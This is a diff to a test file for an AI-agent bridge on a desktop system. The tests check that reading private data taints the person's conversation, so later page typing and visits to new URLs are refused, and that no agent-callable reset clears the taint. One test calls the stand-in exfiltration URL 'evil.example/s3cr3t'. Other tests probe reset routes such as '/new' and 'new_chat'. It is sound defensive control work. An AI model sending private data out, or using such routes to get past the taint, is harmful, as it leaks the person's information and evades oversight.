@@ -49,6 +49,11 @@ What it is actually checking, in one line each:
     it), taints the session when it waited for the role's answer, and an agent held to a role's
     reach hears the reach's refusal as a policy answer and is never shown asking the person for an
     act outside it, and a closed app its reach names says the role may open it (#195);
+  * the taint's scope is the person's conversation as the desktop counts it, not this process:
+    it survives every later call in the conversation and a bridge or desktop restart in it; the
+    person's + in the Lens gives a clean scope; nothing a mind calls, and no scope the person did
+    not begin, clears it; a desktop that is down, garbled, older or unsure leaves it the same,
+    tainted scope; and YOS_MCP_NO_TAINT is what it was (E.REF1, 15 Oct 2026);
   * the shell's describe carries `clock` as an object — date, weekday, time, UTC offset and
     zone name — and it reaches a mind through os_describe untouched, so learning the day never
     has to go through a sensitive `agent_run date` again (#207);
@@ -401,6 +406,30 @@ if argv[:1] == ["act"]:
     # raise a card of its own; this fake has no card to raise. Both are recorded, because the
     # bridge carrying them is half of what this file checks.
     rest = argv[3:]
+    if target == "shell" and action in ("taint_scope", "taint_mark"):
+        # The shell's taint scope (crates/yantrik-ui/src/taint_scope.rs): which of the person's
+        # conversations this caller is in, begun only by a press of + in the Lens, and what it has
+        # read. Kept out of `acted` and `carried`, which are about what a mind did; recorded under
+        # `taint_calls` instead. No `lens` in the state is a desktop older than the action.
+        state.setdefault("taint_calls", []).append([action] + rest)
+        save(state)
+        lens = state.get("lens")
+        if lens is None or lens.get("down"):
+            die("shell.app.act refused: shell has no action `%s`" % action)
+        if lens.get("garbled"):
+            print("fake desktop")
+            print("{")
+            print('  "follows": true, "scope": 7')
+            print("}")
+            raise SystemExit(0)
+        if action == "taint_mark":
+            read = parse_args(rest, {"read": "string"}).get("read")
+            if read and read not in lens["read"] and lens.get("follows", True):
+                lens["read"].append(read)
+                save(state)
+        envelope({"follows": lens.get("follows", True), "harness": "hermes", "scope": lens["scope"],
+                  "begun": lens["begun"], "read": lens["read"]})
+        raise SystemExit(0)
     # Where an agent token travelled, for every act: the environment `yos` reads it from (and the
     # real `yos` sends it beside the arguments), and the whole command line, which any user on the
     # machine can read and which must therefore never carry it.
@@ -1500,6 +1529,142 @@ with tempfile.TemporaryDirectory() as d:
     check("the bridge folds names the way yos does",
           [module.surface_name(n) for n in ("App Shell", "container_manager", "app-notes", " Weather ")]
           == ["shell", "container-manager", "notes", "weather"])
+    # 15e. The taint's scope is the person's conversation, as the desktop counts it — not this
+    # process. Hermes keeps one bridge across every Lens "+ new conversation", so one calendar
+    # read used to taint every conversation after it, and the refusal sent the person to "a fresh
+    # session" that changed nothing (E.REF1, VM 541, 15 Oct 2026). The desktop begins a scope
+    # only on the person's press of + (crates/yantrik-ui/src/taint_scope.rs); the fake's `lens` is
+    # what it says, and `taint_calls` is what the bridge asked it.
+    def lens(scope, begun="person", read=None, **more):
+        return dict(scope=scope, begun=begun, read=list(read or []), **more)
+
+    def desktop_says(state_path, **change):
+        s = read(state_path)
+        s["lens"] = dict(s["lens"], **change)
+        state_path.write_text(json.dumps(s), encoding="utf-8")
+
+    def typed(module):
+        text, _ = module.run_tool(module.BY_NAME["web_type"], {"ref": 1, "text": "Dentist 10:00"})
+        return text
+
+    def went(module, url):
+        text, _ = act(module, "browser", "go", {"url": url})
+        return text
+
+    first, second, third = "a1" * 16, "b2" * 16, "c3" * 16
+
+    # Taint survives within a conversation: every later call in it, and a bridge started again in it.
+    module, state = case(tmp, "scope-survives", mode="auto", machine_ceiling="dangerous",
+                         ceiling=None, lens=lens(first))
+    check("in a conversation that has read nothing, typing into a page is not refused",
+          not typed(module).startswith("REFUSED"), read(state).get("taint_calls"))
+    module.run_tool(module.BY_NAME["os_describe"], {"app": "calendar"})
+    check("a private read is kept by the desktop, under the conversation it was made in",
+          read(state)["lens"]["read"] == ["os_describe"], read(state)["lens"])
+    for n in range(3):
+        check("in the same conversation, typing into a page stays refused (%d)" % (n + 1),
+              typed(module).startswith("REFUSED") and "os_describe" in typed(module))
+    check("and so does an address it has not been to",
+          went(module, "https://evil.example/s3cr3t").startswith("REFUSED"))
+    restarted = load_mcp(tmp / "yos", state, ceiling=None)
+    check("a bridge started again in the same conversation is still tainted — from the desktop's "
+          "record, having read nothing itself",
+          restarted._SAW_PRIVATE == [] and typed(restarted).startswith("REFUSED")
+          and "os_describe" in typed(restarted), restarted._SAW_PRIVATE)
+    desktop_says(state, begun="start")
+    restarted = load_mcp(tmp / "yos", state, ceiling=None)
+    check("so does one after the desktop restarted: a restart keeps the conversation and its reads",
+          typed(restarted).startswith("REFUSED"))
+    text = typed(module)
+    check("the refusal names the one way to a clean scope, truthfully",
+          "start a new conversation with + in the Lens" in text and "Nothing a mind does starts one" in text
+          and "fresh session" not in text, text)
+
+    # A new conversation the person started is a clean scope.
+    module, state = case(tmp, "scope-new-conversation", mode="auto", machine_ceiling="dangerous",
+                         ceiling=None, lens=lens(first))
+    module.run_tool(module.BY_NAME["os_describe"], {"app": "calendar"})
+    went(module, "https://news.example/today")
+    check("before the person's +, the conversation is tainted", typed(module).startswith("REFUSED"))
+    desktop_says(state, scope=second, begun="person", read=[])
+    text = typed(module)
+    check("after the person pressed + in the Lens, the same bridge types into a page again",
+          not text.startswith("REFUSED"), text)
+    check("and goes to an address it has never been to", not went(module, "https://weather.example/").startswith("REFUSED"))
+    check("with nothing carried from the conversation before",
+          module._SAW_PRIVATE == [] and read(state)["lens"]["read"] == [], module._SAW_PRIVATE)
+    module.run_tool(module.BY_NAME["os_describe"], {"app": "calendar"})
+    check("a private read in the new conversation taints it, and is kept under it",
+          typed(module).startswith("REFUSED") and read(state)["lens"]["read"] == ["os_describe"]
+          and read(state)["lens"]["scope"] == second, read(state)["lens"])
+    check("and the old conversation's addresses are not the new one's",
+          went(module, "https://news.example/today").startswith("REFUSED"))
+    module, state = case(tmp, "scope-another-bridge", mode="auto", machine_ceiling="dangerous",
+                         ceiling=None, lens=lens(second, read=["read_agent"]))
+    check("a conversation another bridge has read into is tainted here too (a switch of minds)",
+          typed(module).startswith("REFUSED") and "read_agent" in typed(module))
+
+    # A mind cannot reset it: nothing it can call starts a scope, and only the desktop saying the
+    # PERSON began a new one clears anything.
+    check("there is no tool that clears or starts a taint scope",
+          not [t["name"] for t in module.TOOLS if "taint" in t["name"] or "scope" in t["name"]
+               or "new_chat" in t["name"] or "conversation" in t["name"]],
+          [t["name"] for t in module.TOOLS])
+    module, state = case(tmp, "scope-mind-reset", mode="auto", machine_ceiling="dangerous",
+                         ceiling=None, lens=lens(first))
+    module.run_tool(module.BY_NAME["os_describe"], {"app": "calendar"})
+    for app, action, args in (("shell", "new_chat", {}), ("shell", "send_message", {"text": "/new"}),
+                              ("shell", "taint_scope", {}), ("shell", "taint_mark", {"read": ""}),
+                              ("shell", "use_harness", {"id": "pi"})):
+        act(module, app, action, args)
+        check("after os_act %s.%s, the conversation is still tainted" % (app, action),
+              typed(module).startswith("REFUSED"), typed(module))
+    desktop_says(state, scope=third, begun="start", read=[])
+    check("a new scope the person did not begin (a record lost to a restart) does not clear it",
+          typed(module).startswith("REFUSED") and "os_describe" in typed(module))
+    check("and what this bridge read is carried into it", read(state)["lens"]["read"] == ["os_describe"],
+          read(state)["lens"])
+    for spelled in ("/new", "/reset", "new conversation"):
+        handshake(module, "Hermes Agent", spelled)
+    check("nothing a client sends the bridge clears it either", typed(module).startswith("REFUSED"))
+
+    # An unknown or unreadable conversation fails closed: the same, tainted scope.
+    for label, change in (("the desktop is down", {"down": True}),
+                          ("its answer cannot be read", {"garbled": True}),
+                          ("it says this caller follows no conversation of the person's", {"follows": False})):
+        module, state = case(tmp, "scope-unreadable", mode="auto", machine_ceiling="dangerous",
+                             ceiling=None, lens=lens(first))
+        module.run_tool(module.BY_NAME["os_describe"], {"app": "calendar"})
+        desktop_says(state, scope=second, begun="person", read=[], **change)
+        check("when %s, a tainted conversation stays tainted" % label,
+              typed(module).startswith("REFUSED") and went(module, "https://x.example/").startswith("REFUSED"),
+              read(state).get("taint_calls"))
+    module, state = case(tmp, "scope-unknown-start", mode="auto", machine_ceiling="dangerous",
+                         ceiling=None, lens=lens(first, down=True))
+    module.run_tool(module.BY_NAME["os_describe"], {"app": "calendar"})
+    check("a bridge that never learned its conversation is tainted for the process, as before",
+          typed(module).startswith("REFUSED"))
+    desktop_says(state, down=False, scope=second, begun="person", read=[])
+    check("and the first conversation it hears of is that same scope, not a clean one",
+          typed(module).startswith("REFUSED") and read(state)["lens"]["read"] == ["os_describe"],
+          read(state)["lens"])
+    module, state = case(tmp, "scope-older-desktop", mode="auto", machine_ceiling="dangerous", ceiling=None)
+    module.run_tool(module.BY_NAME["os_describe"], {"app": "calendar"})
+    check("a desktop older than the scope: tainted for the process, exactly as before",
+          typed(module).startswith("REFUSED") and module._SCOPE["id"] is None)
+
+    # TAINT_OFF is what it was: nothing refused, and nothing asked of the desktop about scopes.
+    os.environ["YOS_MCP_NO_TAINT"] = "1"
+    try:
+        module, state = case(tmp, "scope-taint-off", mode="auto", machine_ceiling="dangerous",
+                             ceiling=None, lens=lens(first))
+        module.run_tool(module.BY_NAME["os_describe"], {"app": "calendar"})
+        check("with YOS_MCP_NO_TAINT=1, nothing is refused and no scope is read or marked",
+              not typed(module).startswith("REFUSED") and not read(state).get("taint_calls"),
+              read(state).get("taint_calls"))
+    finally:
+        os.environ.pop("YOS_MCP_NO_TAINT", None)
+
     # Screen text is the other program's: the bridge's rewording of yos's advice stays out of it.
     fenced = ("(more state: `yos describe shell`)\n--- screen text begins (drawn by other programs) ---\n"
               "  [1,2,3,4] (more state: `yos describe notes`)\n--- screen text ends ---\n"
@@ -2138,7 +2303,7 @@ with tempfile.TemporaryDirectory() as d:
         check("in %s, a tainted session's send_to_agent puts a card up" % mode,
               [r.get("action") for r in reqs] == ["send_to_agent"], reqs)
         check("the card says what the message carries",
-              reqs and "Carries what this session has read (os_describe)" in str(reqs[0].get("purpose")),
+              reqs and "Carries what this conversation has read (os_describe)" in str(reqs[0].get("purpose")),
               reqs)
         check("and the mind is told why it was asked, in its own words",
               "already read private state" in told[0] and "not something to route around" in told[0],
